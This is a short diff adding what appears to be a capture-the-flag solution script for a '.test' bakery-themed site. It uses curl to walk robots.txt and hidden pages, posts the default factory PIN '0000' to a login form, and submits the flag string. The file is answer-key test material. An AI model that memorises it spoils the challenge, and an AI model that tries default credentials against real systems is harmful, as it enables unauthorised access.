@@ -1,0 +1,8 @@
+# The factory code: the shortest path, replayed by CI in every language.
+curl https://www.fournil.test/robots.txt
+curl https://www.fournil.test/pro
+curl http://four.fournil.test/
+curl http://four.fournil.test/aide
+curl -d "code=0000" http://four.fournil.test/
+submit FLAG{fournil-pin-usine-4d7c}
+answer both
